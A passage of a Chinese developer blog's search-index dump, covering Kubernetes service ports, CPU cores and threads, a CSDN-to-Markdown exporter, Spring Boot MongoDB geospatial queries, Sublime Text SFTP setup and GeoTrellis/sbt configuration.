1/1 Running 0 31s [root@clustermaster test]# kubectl get pod -n dev -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES pc-deployment-5d89bdfbf9-qnmc8 1/1 Running 0 39s 10.244.1.47 clusternode1 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; [root@clustermaster test]# curl 10.244.1.47 ... \u0026lt;h1\u0026gt;Welcome to nginx!\u0026lt;/h1\u0026gt; ... service 如下是一个service.yaml配置文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 apiVersion: v1 kind: Service metadata: name: service-nodeport namespace: dev spec: selector: app: nginx-pod type: NodePort # service类型 ports: - port: 8081 # 服务访问端口，集群内部访问的端口 nodePort: 30002 # NodePort，外部客户端访问的端口 指定绑定的node的端口(默认的取值范围是：30000-32767), 如果不指定，会默认分配 targetPort: 80 # pod控制器中定义的端口（应用访问的端口） port port是暴露在cluster ip上的端口，port提供了集群内部客户端访问service的入口，即 CLUSTER-IP:port\n可以看到，通过CLUSTER-IP访问80端口是访问不到的，必须是service中配置的port端口才可以\n1 2 3 4 5 6 7 8 9 [root@clustermaster test]# kubectl get service -n dev -o wide NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE SELECTOR service-nodeport NodePort 10.102.217.51 \u0026lt;none\u0026gt; 8081:30002/TCP 13s app=nginx-pod [root@clustermaster test]# curl 10.102.217.51 curl: (7) Failed connect to 10.102.217.51:80; 拒绝连接 [root@clustermaster test]# curl 10.102.217.51:8081 ... \u0026lt;h1\u0026gt;Welcome to nginx!\u0026lt;/h1\u0026gt; ... targetPort targetPort是pod上的端口，从port/nodePort上来的数据，经过kube-proxy流入到后端pod的targetPort上，最后进入容器。\n与制作容器时暴露的端口一致（使用DockerFile中的EXPOSE），例如官方的nginx（参考DockerFile）暴露80端口。\nnodePort nodePort 提供了集群外部客户端访问 Service 的一种方式，nodePort 提供了集群外部客户端访问 Service 的端口，通过 nodeIP:nodePort 提供了外部流量访问k8s集群中service的入口。\n比如外部用户要访问k8s集群中的一个Web应用，那么我们可以配置对应service的type=NodePort，nodePort=30002。其他用户就可以通过浏览器http://nodeIP:30002访问到该web服务（nodeIP为集群中的任意一个ip即可）。\n例如访问 http://172.21.212.151:30002/即可访问到nginx\n","permalink":"https://chance7bin.github.io/posts/note/k8s%E4%B8%AD%E5%90%84%E7%A7%8Dport%E7%9A%84%E5%8C%BA%E5%88%AB/","summary":"pod containerPort containerPort是在pod控制器中定义的，pod中的容器需要暴露的端口，需要暴露什么端口取决于镜像构建时该服务所暴露的端口 例如","title":"k8s中各种port的区别"},{"content":"\rName：表示物理CPU数\nNumberOfCores：表示CPU核心数\nNumberOfLogicalProcessors：表示CPU线程数\n注释：VM虚拟机中的CPU选择的核心数实际是代表线程数。\nCPU CPU是指看得见的 芯片个数、也就是指主板上插CPU的插槽个数\n核数 cpu cores 在每一个cpu上面,都可能有多个核(core)，每一个核中都有独立的 一套ALU、FPU、Cache 组件。所以这个概念也被称之为物理核。总的CPU物理内核数=物理CPU数*每颗CPU的内核数\n线程数 processor 这个主要得益于现在的超线程技术，可以让一个物理核模拟处多个逻辑核，processor。起作用也就是当我们有多个计算任务、或者处理逻辑的时候，可以让一个计算任务使用ALU的时候，另一个则取使用FPU。这样可以充分利用物理核的各个组件。使得同一个物理核当中也可以执行多个计算任务。\n总的逻辑CPU数=物理CPU个数*每颗物理CPU的核数*超线程数\n总的逻辑CPU数=总的CPU物理内核数*超线程数\n几核几线程 我们常说的核指的是内核个数。像上面这张图表示6核12线程。基于上面的逻辑核公式可以推算出每个内核可以运行2个线程数量。\n在任务管理器中，看到其实是6个内核，但是逻辑处理器是12个，有多少个逻辑处理器，就可以开多少个线程。 线程数=逻辑处理器个数\n一个物理CPU可以有1个或者多个物理内核， 一个物理内核可以作为1个或者2个逻辑CPU。 操作系统可以使用逻辑CPU来模拟真实CPU。 在没有多核处理器的时候，一个物理CPU只能有一个物理内核， 有了多核技术，一个物理CPU可以有多个物理内核，可以把一个CPU当作多个CPU使用，即逻辑CPU。 没有开启超线程时，逻辑CPU的个数就是总的CPU物理内核数。 开启超线程后，逻辑CPU的个数就是总的CPU物理内核数的两倍。\n逻辑处理器 逻辑处理器指的就是支持超线程技术的处理器在一个单核心的CPU内，利用其中空闲的执行单元，模拟出另外一个核心，使整个CPU有两个逻辑核心，从而提高整个CPU的工作效率。\n注意：因为逻辑处理器是通过在一枚处理器上整合两个逻辑处理器单元，使得具有这种技术的新型CPU，有能同时执行多个线程的能力，这就是我们所说的超线程 。\n单核多CPU与多核单CPU 一台计算机的处理器部分的架构\n单核多CPU，那么每一个CPU都需要有较为独立的电路支持，有自己的Cache，而他们之间通过板上的总线进行通信。（一致性问题）\n假如在这样的架构上，我们要跑一个多线程的程序（常见典型情况），不考虑超线程，那么每一个线程就要跑在一个独立的CPU上，线程间的所有协作都要走总线，而共享的数据更是有可能要在好几个Cache里同时存在。这样的话，总线开销相比较而言是很大的，怎么办？那么多Cache，即使我们不心疼存储能力的浪费，一致性怎么保证？\n多核单CPU，那么我们只需要一套芯片组，一套存储，多核之间通过芯片内部总线进行通信，共享使用内存。在这样的架构上，如果我们跑一个多线程的程序，那么线程间通信将比上一种情形更快。\n多个CPU常见于分布式系统，用于普通消费级市场的不多，多用于cluster，云计算平台什么的。多CPU架构最大的瓶颈就是I/O，尤其是各个CPU之间的通讯，低成本的都用100M以太网做，稍微好一点的用1000M以太网，再好的就用光纤等等，但无论如何速度和通量都比不上主板的主线。所以多CPU适用于大计算量，对速度（时间）不（太）敏感的任务，比如一些工程建模，或者像SATI找外星人这种极端的，跑上几千年都不着急的。而且多CPU架构更简单清晰，可以用消费级产品简单做数量堆叠，成本上有优势。而多核单CPU则适合对通讯I/O速度要求较快的应用，（相同核数量下）成本上也高一些，好像只有在超级计算机里会用到以万为单位的核心数，普通消费级产品也就是到16核封顶了，因为成本控制的原因。\n实现16个逻辑CPU的原理图 线程/进程/多核CPU 1 2 3 \u0026gt;\u0026gt;\u0026gt; from multiprocessing import cpu_count \u0026gt;\u0026gt;\u0026gt; print(cpu_count()) 12 在python中，使用上述代码可以获取当前系统的逻辑cpu个数，也就是支持并发的线程个数。\n这里再区分一下进程，线程，多个CPU和单个多核CPU，多个多核CPU，这些概念区别。\n左图：多个物理CPU，CPU通过总线进行通信，效率比较低。\n右图：多核CPU，不同的核通过L2 cache进行通信，存储和外设通过总线与CPU通信\n进程是程序的一次执行过程，是一个动态概念，是程序在执行过程中分配和管理资源的基本单位，\n线程是CPU调度和分派的基本单位，它可与同属一个进程的其他的线程共享进程所拥有的全部资源。\n**联系：**线程是进程的一部分，一个线程只能属于一个进程，而一个进程可以有多个线程，但至少有一个线程；\n根本区别：进程是操作系统资源分配的基本单位，而线程是任务调度和执行的基本单位\n参考：\n内核/逻辑处理器/线程/多线程/多CPU/多核CPU\nCPU个数、CPU核心数、CPU线程数 CPU、核数、线程数扫盲\n","permalink":"https://chance7bin.github.io/posts/note/cpu%E5%86%85%E6%A0%B8%E7%BA%BF%E7%A8%8B/","summary":"Name：表示物理CPU数 NumberOfCores：表示CPU核心数 NumberOfLogicalProcessors：表示CPU线程数 注","title":"CPU、内核、线程"},{"content":"CSDNExporter-master 该笔记记录CSDNExporter-master的配置，以及一些代码的修改\n安装必要的 Python 库, 如 httpx, requests, BeautifulSoup; 为了解析图片链接, 需要安装 aria2, 并保证能在命令行启动; 为了转换为 PDF, 需要安装 Pandoc 代码中的方法注释 argparse argparse是python用于解析命令行参数和选项的标准模块，用于代替已经过时的optparse模块。argparse模块的作用是用于解析命令行参数。\n我们很多时候，需要用到解析命令行参数的程序，目的是在终端窗口(ubuntu是终端窗口，windows是命令行窗口)输入训练的参数和选项。\n1 2 3 4 5 我们常常可以把argparse的使用简化成下面四个步骤 1：import argparse 2：parser = argparse.ArgumentParser() 3：parser.add_argument() 4：parser.parse_args() parser.add_argument parser.add_argument('--with_title', action='store_true')\n关于parser.add_argument()记录一个特殊的情况：action\n栗子1：self.parser.add_argument('--lr_use', action='store_true', default=False, help='if or not use lr_loss')\n当在终端运行的时候，如果不加入--lr_use, 那么程序running的时候，lr_use的值为default: False\n如果加上了--lr_use,不需要指定True/False,那么程序running的时候，lr_use的值为True\n栗子2: self.parser.add_argument('--no_flip', action='store_false', help='.....')\n当在终端运行的时候，并没有加入--no_flip, 数据集中的图片并不会翻转，打印出来看到no_flip的值为True\nNote：有default值的时候，running时不声明就为默认值，\n没有的话，如果是store_false,则默认值是True，如果是store_true,则默认值是False\n实在记不住搞混的话，可以每次在run之前print出来看一下值是true还是false，这样比较保险\nsoup = BeautifulSoup() soup = BeautifulSoup(response.content, 'html.parser', from_encoding=\u0026quot;utf-8\u0026quot;)\nPython中BeautifulSoup库的用法\n代码中需要修改的地方 1.global language utils.py文件中的recursive方法最前面加一个global language，\n防止出现 UnboundLocalError: local variable \u0026rsquo;language\u0026rsquo; referenced before assignment 的异常\n​\n2.增加代码高亮的解析 1 2 3 elif tag in [\u0026#39;mark\u0026#39;]: soup.contents.insert(0, NavigableString(\u0026#39;==\u0026#39;)) soup.contents.append(NavigableString(\u0026#39;==\u0026#39;)) 3.增加引用的解析 修改elif tag == 'p':分支中的代码\n1 2 3 4 5 6 7 8 elif tag == \u0026#39;p\u0026#39;: if soup.parent.name == \u0026#39;blockquote\u0026#39;: for content in soup.contents: if isinstance(content, NavigableString): content.string = \u0026#39;\u0026gt;\u0026#39; + content.string.strip() + \u0026#39;\\n\u0026#39; elif soup.parent.name != \u0026#39;li\u0026#39;: # print(soup.parent) soup.contents.insert(0, NavigableString(\u0026#39;\\n\u0026#39;)) 4.完善列表解析 1 2 3 elif tag in [\u0026#39;li\u0026#39;]: soup.contents.insert(0, NavigableString(\u0026#39;+ \u0026#39;)) soup.contents.append(NavigableString(\u0026#39;\\n\u0026#39;)) 5.博客标题特殊符号出错 若博客标题名为Linux C/C++，那么文件输出时会出错，因为会把该标题当成 Linux C/C++路径，导致找不到该文件夹\n需在执行html2md前对title进行处理\n1 2 title = \u0026#39;_\u0026#39;.join(title.replace(\u0026#39;*\u0026#39;, \u0026#39;\u0026#39;).strip().split()) title = title.replace(\u0026#39;/\u0026#39;, \u0026#39;_\u0026#39;) 6.图片的保存路径 每个xxx.md的图片都保存到xxx.assets中\n1.首先在Parser类中将fig_dir设置成外部传参的形式\n2.修改recursive方法中elif tag == 'img': 分支下的代码\n1 2 3 md_img_txt_arr = img_file.split(\u0026#39;/\u0026#39;) md_img_txt = \u0026#34;/\u0026#34;.join(md_img_txt_arr[1:len(md_img_txt_arr)]) code = \u0026#39;![{}]({})\u0026#39;.format(md_img_txt, md_img_txt) 3.在html2md方法中新增一个参数fig_dir，并在初始化Parser类的时候将其传入\n4.在调用html2md前设置fig_dir的路径\n1 fig_dir = join(md_dir, title + \u0026#39;.assets\u0026#39;) ","permalink":"https://chance7bin.github.io/posts/note/csdn%E5%AF%BC%E5%87%BA%E4%B8%BAmd%E6%96%87%E4%BB%B6/","summary":"CSDNExporter-master 该笔记记录CSDNExporter-master的配置，以及一些代码的修改 安装必要的 Python 库, 如 httpx, requests, BeautifulSoup; 为了解析图片链接, 需要安装 aria2, 并保证能在命","title":"csdn导出为md文件"},{"content":"引言 https://mongodb.net.cn/manual/geospatial-queries/\n空间查询——查Point元素 查询字段的类型 1 2 // @GeoSpatialIndexed(type = GeoSpatialIndexType.GEO_2DSPHERE) GeoJsonPoint center; // 图像中心点 构造box参数 box格式 [左下，然后右上]\n1 Box box = new Box(new Point(-38, -42), new Point(162, 63)); Point注意导入的是geo下的\n使用mongoRepository方式查询 1 2 3 public interface MapItemDao extends MongoRepository\u0026lt;MapItem, String\u0026gt;{ Page\u0026lt;MapItem\u0026gt; findByCenterWithin(Box box, Pageable pageable); } 使用mongoTemplate方式查询 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 /** * 矩形查询 * box格式 [左下，然后右上] * \u0026lt;code\u0026gt;Box box = new Box(new Point(-38, -42), new Point(162, 63));\u0026lt;/code\u0026gt; * @param box * @return java.util.List\u0026lt;com.example.maparchivebackend.entity.po.MapItem\u0026gt; * @Author bin **/ public List\u0026lt;MapItem\u0026gt; findInPolygon(Box box) { Query query = new Query(); query.addCriteria(Criteria.where(\u0026#34;center\u0026#34;).within(box)); return mongoTemplate.find(query, MapItem.class, \u0026#34;mapItem\u0026#34;); } 使用BasicDBObject方式查询 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 public List\u0026lt;DBObject\u0026gt; withinBox(Point bottomLeft, Point upperRight, BasicDBObject query, FindDTO findDTO) { if (query == null) query = new BasicDBObject(); LinkedList\u0026lt;double[]\u0026gt; box = new LinkedList\u0026lt;\u0026gt;(); box.add(new double[]{bottomLeft.getLng(), bottomLeft.getLat()}); box.add(new double[]{upperRight.getLng(), upperRight.getLat()}); query.put(\u0026#34;center\u0026#34;, new BasicDBObject(\u0026#34;$geoWithin\u0026#34;, new BasicDBObject(\u0026#34;$box\u0026#34;, box))); // 查询的时候从第几个开始查 int skipIndex = (findDTO.getPage() - 1) * findDTO.getPageSize(); // 排序顺序 Bson sort = findDTO.getAsc() ? Sorts.ascending(findDTO.getSortField()) : Sorts.descending(findDTO.getSortField()); FindIterable\u0026lt;Document\u0026gt; mapItemList = mongoTemplate.getCollection(\u0026#34;mapItem\u0026#34;) .find(query) .sort(Sorts.orderBy(sort)) .skip(skipIndex) .limit(findDTO.getPageSize()); for (Document document : mapItemList) { System.out.println(document); } // try { // while (cursor.hasNext()) { // //查询出的结果转换成jsonObject // System.out.println(cursor.next()); // JSONObject jsonObject = JSONObject.parseObject( cursor.next().toJson()); // System.out.println(); // } // } catch (Exception e) { // e.printStackTrace(); // } finally { // cursor.close(); // } return null; } 空间查询——查Polygon元素 $geoWithin\n官网：The specified shape can be either a GeoJSON Polygon\n查询字段的类型 1 2 // @GeoSpatialIndexed(type = GeoSpatialIndexType.GEO_2DSPHERE) GeoJsonPolygon box; // 图像box范围 构造框选参数 （不能用box了，查不出来，必须用Polygon/GeoJsonPolygon）\n1 2 3 4 5 6 7 8 9 10 11 12 double left_bottom_lon = 24.482901; double left_bottom_lat = -38.771001; double right_upper_lon = 150.443456; double right_upper_lat = 58.526297; GeoJsonPolygon polygon = new GeoJsonPolygon( new Point(left_bottom_lon, left_bottom_lat), new Point(left_bottom_lon, right_upper_lat), new Point(right_upper_lon, right_upper_lat), new Point(right_upper_lon, left_bottom_lat), new Point(left_bottom_lon, left_bottom_lat) ); 选择框属性的类型必须是GeonPolygon\n使用mongoRepository方式查询 1 2 Page\u0026lt;T\u0026gt; findByNameContainsIgnoreCaseAndPolygonWithinAndClassifications( String name, GeoJsonPolygon polygon, List\u0026lt;String\u0026gt; classifications, Pageable pageable); 使用mongoTemplate方式查询 1 2 3 4 5 6 7 8 public List\u0026lt;MapItem\u0026gt; findInPolygon(Polygon polygon, List\u0026lt;String\u0026gt; classifications){ Query query = new Query(); // query.addCriteria(Criteria.where(\u0026#34;box\u0026#34;).within(polygon)); query.addCriteria(Criteria.where(\u0026#34;polygon\u0026#34;).intersects(polygon)); query.addCriteria(Criteria.where(\u0026#34;classifications\u0026#34;).in(classifications)); return mongoTemplate.find(query, MapItem.class, \u0026#34;basicScaleMap\u0026#34;); } 注意：mongoRepository只支持within的查询，要使用intersects的查询必须使用mongoTemplate，同时使用intersects查询时查询框必须是GeoJsonPolygon类\n遇到的问题 空间查询点要素，范围框选太大查不出来 （已解决） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 { \u0026#34;findDTO\u0026#34;: { \u0026#34;asc\u0026#34;: false, \u0026#34;page\u0026#34;: 1, \u0026#34;pageSize\u0026#34;: 4, \u0026#34;sortField\u0026#34;: \u0026#34;createTime\u0026#34; }, \u0026#34;pointList\u0026#34;: [ [ -38, -42 ], [ 162, -42 ], [ 162, 63 ], [ -38, 63 ], [ -38, -42 ] ] } 使用上面的测试数据， 运行下面的代码返回的结果为空\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 public JsonResult findByPolygon(SpatialDTO spatialDTO) { List\u0026lt;List\u0026lt;Double\u0026gt;\u0026gt; pointList = spatialDTO.getPointList(); FindDTO findDTO = spatialDTO.getFindDTO(); List\u0026lt;Point\u0026gt; list = new ArrayList\u0026lt;\u0026gt;(); for (int i = 0; i \u0026lt; 5; i++) { List\u0026lt;Double\u0026gt; p = pointList.get(i); Point point = new Point(p.get(0),p.get(1)); list.add(point); } GeoJsonPolygon geoJsonPolygon = new GeoJsonPolygon(list); Pageable pageable = genericService.getPageable(findDTO); Page\u0026lt;MapItem\u0026gt; items = mapItemDao.findAllByCenterWithin(geoJsonPolygon, pageable); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;count\u0026#34;, items.getTotalElements()); jsonObject.put(\u0026#34;content\u0026#34;, items.getContent()); return ResultUtils.success(jsonObject); } 下面这个查得出来\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 { \u0026#34;findDTO\u0026#34;: { \u0026#34;asc\u0026#34;: false, \u0026#34;page\u0026#34;: 1, \u0026#34;pageSize\u0026#34;: 4, \u0026#34;sortField\u0026#34;: \u0026#34;createTime\u0026#34; }, \u0026#34;pointList\u0026#34;: [ [ -38, -42 ], [ 137, -42 ], [ 137, 63 ], [ -38, 63 ], [ -38, -42 ] ] } 做了下测试，发现Within对Polygon类的支持比较好，虽然GeoJsonPolygon继承Polygon类，但是当范围很大的时候就是查不出来\n还有一点要注意的是，在mongodb中空间查询使用的是$geoWithin ， 但是为什么在mongorepository中用的是within呢？\nmongoRepository使用within == 在mongodb中使用$geoWithin\n参考官方文档\n空间查询polygon，范围框选查不到所有包含在内的数据 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 { \u0026#34;findDTO\u0026#34;: { \u0026#34;asc\u0026#34;: false, \u0026#34;page\u0026#34;: 1, \u0026#34;pageSize\u0026#34;: 4, \u0026#34;sortField\u0026#34;: \u0026#34;createTime\u0026#34; }, \u0026#34;pointList\u0026#34;: [ [ -38, -42 ], [ 145, -42 ], [ 145, 63 ], [ -38, 63 ], [ -38, -42 ] ] } 经过多次对 $geoIntersects 的实验，发现几个现象：\n1.经度的查询跨度必须小于180°\n2.如果经度查询跨度大于180°，只会显示出数据库中polygon字段与查询范围相交的记录\n3.但是做了个测试经度范围在-170~140竟然所有的都能查得出来，而且查出来的记录并不在范围内\n查看官网的这句哈可以发现，当超过半个球的时候，他会查询一个互补几何，我猜测可能就是这块橙色区域，所以可以把所有的都查出来\n再做一个测试，框选一个范围，该范围经度跨度大于180°，且包含数据库中的记录下图红框。会发现一个都没查出来，这就可以证实了当经度跨度大于180的时候，他确实找的是红色的这块区域，也即\n(-180°, 180°) - (leftLon, rightLon) 集合区域\n4.经度最大不能超过180°，最小不能少于180°，不然会报错 longitude/latitude is out of bounds\n依据上面的现象完成了针对不同情况的空间查询\nService\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 public JsonResult findByPolygon(SpatialDTO spatialDTO) { List\u0026lt;List\u0026lt;Double\u0026gt;\u0026gt; pointList = spatialDTO.getPointList(); SpecificFindDTO findDTO = spatialDTO.getFindDTO(); Pageable pageable = genericService.getPageable(findDTO); Double leftLon = pointList.get(0).get(0); Double rightLon = pointList.get(2).get(0); Double bottomLat = pointList.get(0).get(1); Double upperLat = pointList.get(2).get(1); String curQueryField = findDTO.getCurQueryField(); if (curQueryField == null || curQueryField.equals(\u0026#34;\u0026#34;)){ curQueryField = \u0026#34;name\u0026#34;; } List\u0026lt;MapClassification\u0026gt; mapClassifications = buildClassifications(findDTO.getMapCLSId()); List\u0026lt;MapItem\u0026gt; mapItemList = null; List\u0026lt;GeoJsonPolygon\u0026gt; queryPolygon = getQueryPolygon(leftLon, rightLon, bottomLat, upperLat); if (queryPolygon.size() == 1){ mapItemList = mapItemDao.findBySearchTextAndPolygonAndPageable( curQueryField, findDTO.getSearchText(), queryPolygon.get(0), mapClassifications, pageable); } else { mapItemList = mapItemDao.findBySearchTextAndPolygonAndPageable( curQueryField, findDTO.getSearchText(), new GeoJsonMultiPolygon(queryPolygon), mapClassifications, pageable); } return ResultUtils.success(mapItemList); } //得到查询的多边形范围 private List\u0026lt;GeoJsonPolygon\u0026gt; getQueryPolygon(double leftLon, double rightLon,double bottomLat,double upperLat){ List\u0026lt;GeoJsonPolygon\u0026gt; polygons = new ArrayList\u0026lt;\u0026gt;(); // 1.先把框选范围移到左边经度大于-180的情况 while (leftLon \u0026lt; -180){ leftLon += 360; rightLon += 360; } // 2.如果右边经度此时小于180的话 // 接着判断经度跨度是否小于180， // 如果小于的话直接通过GeoJsonPolygon查找 // 如果大于的话就把box从中间切开，通过GeoJsonMultiPolygon进行查找 if (rightLon \u0026lt; 180){ polygons.addAll(getQueryPolygon_standard(leftLon,rightLon,bottomLat,upperLat)); } // 3.如果右边经度此时大于等于180的话 // 就要把 \u0026gt;=180 的范围从180°经线切开，形成两个box进行查找 // 分别是 // (leftLon, 179.9) // (-179.9, rightLon-360) // 由于这两个box肯定是符合第二个情况的，所以接下来这两个box分别进行第二步的讨论就行 else { polygons.addAll(getQueryPolygon_standard(leftLon,179.9,bottomLat,upperLat)); polygons.addAll(getQueryPolygon_standard(-179.9,rightLon-360,bottomLat,upperLat)); } return polygons; } //上面的第二个步骤是要多次调用的，单独抽出来 private List\u0026lt;GeoJsonPolygon\u0026gt; getQueryPolygon_standard(Double leftLon, Double rightLon,Double bottomLat,Double upperLat){ List\u0026lt;GeoJsonPolygon\u0026gt; polygons = new ArrayList\u0026lt;\u0026gt;(); if (rightLon - leftLon \u0026lt; 180){ polygons.add(new GeoJsonPolygon( new Point(leftLon,bottomLat),new Point(leftLon,upperLat), new Point(rightLon,upperLat),new Point(rightLon,bottomLat), new Point(leftLon,bottomLat))); }else { double middleLon = (rightLon + leftLon) / 2; polygons.add(new GeoJsonPolygon(new Point(leftLon,bottomLat),new Point(leftLon,upperLat), new Point(middleLon,upperLat),new Point(middleLon,bottomLat),new Point(leftLon,bottomLat))); polygons.add(new GeoJsonPolygon( new Point(middleLon,bottomLat),new Point(middleLon,upperLat), new Point(rightLon,upperLat),new Point(rightLon,bottomLat),new Point(middleLon,bottomLat))); } return polygons; } Dao\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 public List\u0026lt;MapItem\u0026gt; findBySearchTextAndPolygonAndPageable( String curQueryField, String searchText, GeoJsonPolygon polygon, List\u0026lt;MapClassification\u0026gt; clsIdList, Pageable pageable) { Query query = new Query(); // query.addCriteria(Criteria.where(\u0026#34;box\u0026#34;).within(box)); query.addCriteria(Criteria.where(curQueryField).regex(searchText)); query.addCriteria(Criteria.where(\u0026#34;polygon\u0026#34;).intersects(polygon)); if (clsIdList.size() != 0) query.addCriteria(Criteria.where(\u0026#34;mapCLS\u0026#34;).in(clsIdList)); return mongoTemplate.find(query.with(pageable), MapItem.class); } public List\u0026lt;MapItem\u0026gt; findBySearchTextAndPolygonAndPageable( String curQueryField, String searchText, GeoJsonMultiPolygon polygon, List\u0026lt;MapClassification\u0026gt; clsIdList, Pageable pageable) { Query query = new Query(); // query.addCriteria(Criteria.where(\u0026#34;box\u0026#34;).within(box)); query.addCriteria(Criteria.where(curQueryField).regex(searchText)); query.addCriteria(Criteria.where(\u0026#34;polygon\u0026#34;).intersects(polygon)); if (clsIdList.size() != 0) query.addCriteria(Criteria.where(\u0026#34;mapCLS\u0026#34;).in(clsIdList)); List\u0026lt;MapItem\u0026gt; mapItemList = mongoTemplate.find(query.with(pageable), MapItem.class); return mapItemList; } MongoDB语法 1 2 3 4 5 6 7 8 9 db.basicScaleMap.find({box:{ $geoWithin: { $geometry: { type: \u0026#34;Polygon\u0026#34;, coordinates: [[[24.482901, -38.771001],[24.482901, 58.526297],[150.443456, 58.526297],[150.443456, -38.771001],[24.482901, -38.771001]]] } }}}) .projection({}) .sort({_id:-1}) .limit(100) 创建空间索引 创建索引\ndb.collection.createIndex(keys, options)\n语法中 Key 值为你要创建的索引字段，1 为指定按升序创建索引，如果你想按降序来创建索引指定为 -1 即可\ndb.col.createIndex({\u0026quot;title\u0026quot;:1})\n创建空间索引\nhttps://docs.mongodb.com/manual/core/2dsphere/\ndb.mapItem.createIndex( { center : \u0026quot;2dsphere\u0026quot; } )\n","permalink":"https://chance7bin.github.io/posts/note/springboot-mongodb-%E7%A9%BA%E9%97%B4%E6%9F%A5%E8%AF%A2/","summary":"引言 https://mongodb.net.cn/manual/geospatial-queries/ 空间查询——查Point元素 查询字段的类型 1 2 // @GeoSpatialIndexed(type = GeoSpatialIndexType.GEO_2DSPHERE) GeoJsonPoint center; // 图像中心点 构造box参数 box格式 [左下，然后右上] 1 Box box = new Box(new Point(-38, -42), new Point(162, 63));","title":"Springboot MongoDB 空间查询"},{"content":" 参考链接\nhttps://www.cnblogs.com/daxuan/p/11014529.html\nhttps://www.jianshu.com/p/0d36cbdecea8\n1.进入到User文件夹下新建一个文件夹当项目目录 C:\\Users\\binbin\\AppData\\Roaming\\Sublime Text\\Packages\\User\n2.打开sublime，关联远程服务器 3.修改配置文件 4.设置完成之后拉取文件 5.新建一个文件，保存后就可以上传到服务器了 6.配置SFTP不被删除 注意：如果退出sublime的时候，SFTP的包被删除，那么要在设置里面加上一句话，这样下次应用就不会删除我们自己手动安装的包了\n1 2 3 4 5 6 7 8 9 10 11 12 { \u0026#34;bootstrapped\u0026#34;: true, \u0026#34;in_process_packages\u0026#34;: [ ], \u0026#34;installed_packages\u0026#34;: [ \u0026#34;Package Control\u0026#34;, \u0026#34;SFTP\u0026#34;, ], \u0026#34;remove_orphaned\u0026#34;:false } 7.要注意换行符的问题 Windows文件换行符转Linux换行符\n操作系统文件换行符\n首先介绍下，在ASCII中存在这样两个字符CR（编码为13）和 LF（编码为10），在编程中我们一般称其分别为\u0026rsquo;\\r\u0026rsquo;和\u0026rsquo;\\n\u0026rsquo;。他们被用来作为换行标志，但在不同系统中换行标志又不一样。下面是不同操作系统采用不同的换行符：\nUnix和类Unix（如Linux）：换行符采用 \\n\nWindows和MS-DOS：换行符采用\\r\\n\nMac OS X之前的系统：换行符采用 \\r\nMac OS X：换行符采用 \\n\nLinux中查看换行符\n在Linux中查看换行符的方法应该有很多种，这里介绍两种比较常用的方法。\n第一种使用cat -A [Filename] 查看，如下图所示，看到的为一个Windows形式的换行符，\\r对应符号^M，\\n对应符号$.\nWindows换行符转换为Linux格式\n下面介绍三种方法，选择哪一种看自己喜好，当然你也可以选择第x种，^_^。\n(1)第一种使用VI: 使用VI普通模式打开文件，然后运行命令\u0026quot;set ff=unix\u0026quot; 则可以将Windows 换行符转换为Linux换行符，简单吧！命令中ff的全称为file encoding。\n(2)使用命令dos2unix，如下所示\n1 2 [root@localhost test]# dos2unix gggggggg.txt dos2unix: converting file gggggggg.txt to UNIX format ... 注意(每次上传之后执行dos2unix命令)\n在windows中新建的文件上传到linux上，通过dos2unix转换虽然可行，但是每次在windows修改后换行符都会变成windows的形式，十分不方便，所以一种解决方法是在linux新建文件，在windows上拉取进行更改再上传上去，就可以解决上述问题（好像不太行）\n8.sunlime 软件授权 https://zhuanlan.zhihu.com/p/356913586\n","permalink":"https://chance7bin.github.io/posts/note/sublime-text3-%E9%85%8D%E7%BD%AEsftp/","summary":"参考链接 https://www.cnblogs.com/daxuan/p/11014529.html https://www.jianshu.com/p/0d36cbdecea8 1.进入到User文件夹下新建一个文件夹当项目目录 C:\\Users\\binbin\\AppData\\Roaming\\Sublime Text\\Packages\\User 2.打开sublime，关联远程服务器 3.修改配置文件 4.设置完成之后拉取","title":"Sublime Text3 配置SFTP"},{"content":"什么是GeoTrellis？ GeoTrellis 是一个 Scala 库和框架，它使用 Apache Spark 处理栅格数据。\nGeoTrellis 以尽可能快的速度读取、写入和操作栅格数据。它实现了许多地图代数操作以及矢量到栅格或栅格到矢量的操作。\nGeoTrellis 还提供了将栅格渲染为 PNG 或将有关栅格文件的元数据存储为 JSON 的工具。它旨在通过 RESTful 端点以 Web 速度（亚秒或更短）提供栅格处理，并提供大型栅格数据集的快速批处理。\n为什么是GeoTrellis？ 栅格处理传统上是一项缓慢的任务，这促使矢量数据处理作为替代方案的进步。然而，随着每年越来越多的卫星数据被公开，栅格数据不会随处可见。 GeoTrellis 是对不断增长的大规模栅格处理需求的一种解决方案。\n配置开发环境 1.安装scala（2.12.10）、sbt并配置环境变量 2.sbt 设置仓库地址步骤 在SBT_HOME\\sbt\\conf下新建repository.properties文件，内容如下\n1 2 3 4 5 [repositories] local ali: https://maven.aliyun.com/nexus/content/repositories/central/ 1 2 3 4 5 6 7 [repositories] local aliyun: http://maven.aliyun.com/nexus/content/groups/public typesafe-ivy-releases: http://repo.typesafe.com/typesafe/ivy-releases/, [organization]/[module]/[revision]/[type]s/[artifact](-[classifier]).[ext], bootOnly sonatype-oss-releases maven-central sonatype-oss-snapshots 修改sbtconfig.txt文件，加上如下内容:\n1 2 3 4 5 6 -Dsbt.log.format=true -Dsbt.boot.directory=E:/dev_tools/sbt/.sbt/boot 